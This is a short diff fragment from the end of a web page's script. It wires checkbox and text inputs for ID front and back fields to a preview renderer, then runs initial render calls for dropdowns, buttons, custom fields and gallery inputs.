+$("chkIdFront")?.addEventListener("change", renderPreview);
+$("chkIdBack")?.addEventListener("change", renderPreview);
+$("txtIdFront")?.addEventListener("input", renderPreview);
+$("txtIdBack")?.addEventListener("input", renderPreview);
+
+// -------------------------
+// Initial render
+// -------------------------
+generateAnimationDropdown();
+renderMiniButtons();
+renderCustomFields();
+renderGalleryInputs();
+renderPreview();
+
+});
+</script>
+</body>
+</html>
